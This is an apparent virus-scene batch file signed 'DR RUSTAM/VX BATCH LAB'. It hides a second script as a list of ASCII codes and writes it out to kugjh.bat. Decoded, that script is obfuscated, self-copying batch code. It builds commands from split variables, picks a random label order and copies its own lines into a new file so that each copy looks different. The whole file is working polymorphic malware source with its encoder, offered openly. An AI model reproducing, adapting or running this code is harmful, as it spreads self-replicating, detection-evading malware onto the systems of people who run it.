====-------=-==-===------====--=-====-----=-=-====----==--=-=-=--=----====--
@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
for %%r in (58 80 95 49 32 37 90 90 88 37 13 10
37 90 90 88 37 32 83 69 84 32 86 61 34 34 37 48 34 34 13 10
37 90 90 88 37 32 83 69 84 32 65 88 61 69 84 13 10
37 90 90 88 37 32 67 65 76 76 32 58 80 95 54 13 10
37 90 90 88 37 32 71 79 84 79 32 80 95 50 13 10
58 80 95 50 32 37 90 90 67 37 13 10
37 90 90 67 37 32 83 37 65 88 37 32 83 88 61 79 84 13 10
37 90 90 67 37 32 71 37 83 88 37 79 32 80 95 51 13 10
58 80 95 51 32 37 90 90 86 37 13 10
37 90 90 86 37 32 83 37 65 88 37 32 68 88 61 89 80 13 10
37 90 90 86 37 32 71 37 83 88 37 79 32 80 95 52 13 10
58 80 95 52 32 37 90 90 81 37 32 13 10
37 90 90 81 37 9 73 70 32 37 88 48 37 61 61 49 32 83 37 65 88 37 32 67 86 61 67 32 85 32 66 32 88 32 81 32 86 13 10
37 90 90 81 37 9 73 70 32 37 88 48 37 61 61 50 32 83 37 65 88 37 32 67 86 61 85 32 66 32 88 32 81 32 86 32 67 13 10
37 90 90 81 37 9 73 70 32 37 88 48 37 61 61 51 32 83 37 65 88 37 32 67 86 61 66 32 88 32 81 32 86 32 67 32 85 32 13 10
37 90 90 81 37 9 73 70 32 37 88 48 37 61 61 52 32 83 37 65 88 37 32 67 86 61 88 32 81 32 86 32 67 32 85 32 66 32 13 10
37 90 90 81 37 9 73 70 32 37 88 48 37 61 61 53 32 83 37 65 88 37 32 67 86 61 81 32 86 32 67 32 85 32 66 32 88 13 10
37 90 90 81 37 9 73 70 32 37 88 48 37 61 61 54 32 83 37 65 88 37 32 67 86 61 86 32 67 32 85 32 66 32 88 32 81 13 10
37 90 90 81 37 9 67 65 76 76 32 58 80 95 53 13 10
37 90 90 81 37 32 9 69 88 73 84 13 10
58 80 95 53 32 37 90 90 66 37 13 10
37 90 90 66 37 32 69 67 72 79 46 71 79 84 79 32 80 95 49 62 95 13 10
37 90 90 66 37 32 70 37 70 37 32 37 37 95 32 73 78 32 40 37 67 86 37 41 32 68 79 32 40 13 10
37 90 90 66 37 32 70 37 68 37 32 34 90 90 37 37 95 34 32 60 37 86 37 62 62 95 13 10
37 90 90 66 37 32 41 13 10
37 90 90 66 37 32 71 37 83 88 37 79 32 58 69 79 70 13 10
58 80 95 54 32 37 90 90 85 37 13 10
37 90 90 85 37 9 83 69 84 32 47 65 32 88 48 61 49 43 40 54 45 49 43 49 41 32 42 32 37 82 65 78 68 79 77 37 47 51 50 55 54 56 13 10
37 90 90 85 37 9 83 37 65 88 37 32 70 61 79 82 13 10
37 90 90 85 37 9 83 37 65 88 37 32 68 61 73 78 68 13 10
37 90 90 85 37 32 9 71 37 83 88 37 79 32 58 69 79 70) do call :jjj %%r
echo/!F!>kugjh.bat
pause
:jjj
set "exco=%1"
cmd /c exit /b  %exco%
set "H=%=ExitCodeAscii%"
IF %exco%==32 SET F=!F!
IF %exco%==94 SET F=!F!^^
IF %exco%==33 SET F=!F!^^!
IF %exco%==37 SET F=!F!%
IF %exco%==38 SET F=!F!^&
IF %exco%==60 SET F=!F!^^
IF %exco%==62 SET F=!F!^^
IF %exco%==10 SET F=!F!^
%nul%
%nul%
SET F=!F!!H!
GOTO :EOF

=============================================================================

====-------=-==-===-----==
| DR RUSTAM/VX BATCH LAB |
====--=-====-----=-=-====-